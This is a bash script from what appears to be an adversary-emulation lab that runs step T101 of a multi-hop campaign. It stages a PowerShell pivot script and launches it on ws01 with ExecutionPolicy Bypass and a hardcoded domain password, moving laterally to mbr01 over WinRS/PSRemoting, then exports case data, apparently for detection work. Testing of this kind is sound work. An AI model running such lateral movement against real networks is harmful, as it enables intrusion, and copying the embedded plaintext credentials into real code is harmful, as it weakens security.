#!/usr/bin/env bash
# T101 — Lateral movement: WinRS/PSRemoting from ws01 to mbr01 as analyst_t1.
# This is the first pivot node in the realistic multi-hop campaign.
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T101-WINRS-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
TARGET="${TARGET:-mbr01}"
TARGET_IP="${TARGET_IP:-192.168.77.22}"

echo "=== T101 | ${CASE_ID} | T0=${T0} ==="

PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t101-winrs-pivot.ps1"
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t101-winrs-pivot.ps1"

CMD="powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t101-winrs-pivot.ps1 -Source ws01 -Target ${TARGET} -TargetIP ${TARGET_IP} -Username 'child.cadre.local\\analyst_t1' -Password 'T13r_An@lyst!'"

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T101 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T101 run complete ==="
